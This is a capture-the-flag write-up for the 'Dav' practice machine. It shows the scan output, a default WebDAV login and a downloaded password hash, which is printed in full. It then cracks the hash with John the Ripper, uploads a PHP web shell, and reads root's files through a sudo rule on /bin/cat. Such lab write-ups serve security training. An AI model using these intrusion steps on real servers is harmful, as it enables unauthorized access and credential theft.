## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
# Dav
boot2root machine for FIT and bsides guatemala CTF
```
## IP-Address
```IP-Address
10.48.170.81
```
## Enumeration
#### Port Scan
```bash
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
```
#### Directory Scan
```bash
200      GET       15l       74w     6143c http://10.48.142.73/icons/ubuntu-logo.png
200      GET      375l      968w    11321c http://10.48.142.73/
200      GET      375l      968w    11321c http://10.48.142.73/index.html
200      GET      375l      968w    http://10.48.142.73/webdav
```
- Open on Browser Require Authentication 
- by Default `webdav` uses creds
```creds
username - wampp
password - [password omitted]
```
## Access 
- Inside the `webdav` directory we got the `passwd.dav`
```html
Name	     Last modified	   Size	    	
passwd.dav	2019-08-25 20:43	44	 
```
- Download it 
- Got the creds
```bash
$cat passwd.dav
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```
## John 
```bash
$ john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xampp            (wampp)
1g 0:00:00:00 DONE (2026-04-19 03:38) 33.33g/s 1066p/s 1066c/s 1066C/s xampp..friends
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- Got the `creds`
```bash
$ cadaver http://10.48.170.201/webdav
Authentication required for webdav on server `10.48.170.201':
Username: wampp
Password:
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 2589 bytes succeeded.
dav:/webdav/>
```
- Take the rev-shell
```bash
$ cd /home
$ ls
merlin
wampp
$ cd merlin
$ ls
user.txt
$ cat user.txt
[flag/hash omitted]
```
## Privilege Escalation
```bash
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
$ sudo /bin/cat /root/root.txt
[flag/hash omitted]
```
# END